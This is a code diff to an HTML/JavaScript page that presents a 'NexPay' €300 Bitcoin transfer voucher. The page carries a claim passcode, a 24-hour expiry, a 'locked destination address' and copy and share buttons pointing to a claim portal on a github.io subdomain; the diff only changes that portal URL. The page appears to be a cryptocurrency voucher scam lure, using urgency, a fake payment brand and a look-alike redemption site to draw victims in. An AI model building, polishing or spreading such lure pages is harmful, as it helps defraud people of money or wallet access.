@@ -444,7 +444,7 @@
                 <div class="interactive-field">
                     <div class="field-val-group">
                         <i class="fa-solid fa-link link-icon"></i>
-                        <span class="field-val">https://capitalnest.github.io/NexPay.io-claim--HGFV76HD1/</span>
+                        <span class="field-val">https://capitalnest.github.io/NexPay.io-claim--HGFV76HD22/</span>
                     </div>
                     <button class="icon-btn" onclick="copyValue(this)" title="Copy URL">
                         <i class="fa-regular fa-copy"></i>
@@ -554,7 +554,7 @@
 
         async function copyFullDetails() {
             const lockedAddr = document.getElementById('lockedAddress').value || 'Unassigned';
-            const text = `NexPay Secure Transfer Voucher:\nRedemption Portal: https://capitalnest.github.io/NexPay.io-claim--HGFV76HD1/\nClaim Passcode: 6474-5365\nAmount: €300.00 (0.0056 BTC)\nLocked Destination Address: ${lockedAddr}\nExpires in 24 hours.`;
+            const text = `NexPay Secure Transfer Voucher:\nRedemption Portal: https://capitalnest.github.io/NexPay.io-claim--HGFV76HD22/\nClaim Passcode: 6474-5365\nAmount: €300.00 (0.0056 BTC)\nLocked Destination Address: ${lockedAddr}\nExpires in 24 hours.`;
             const success = await writeToClipboard(text);
             if (success) showToast('All transaction details copied');
         }
@@ -564,7 +564,7 @@
             const shareData = {
                 title: 'NexPay Encrypted Asset Voucher',
                 text: `Claim your €300.00 BTC voucher (Locked to: ${lockedAddr}) via Passcode: 6474-5365`,
-                url: 'https://capitalnest.github.io/NexPay.io-claim--HGFV76HD2/'
+                url: 'https://capitalnest.github.io/NexPay.io-claim--HGFV76HD22/'
             };
 
             if (navigator.share && navigator.canShare && navigator.canShare(shareData)) {
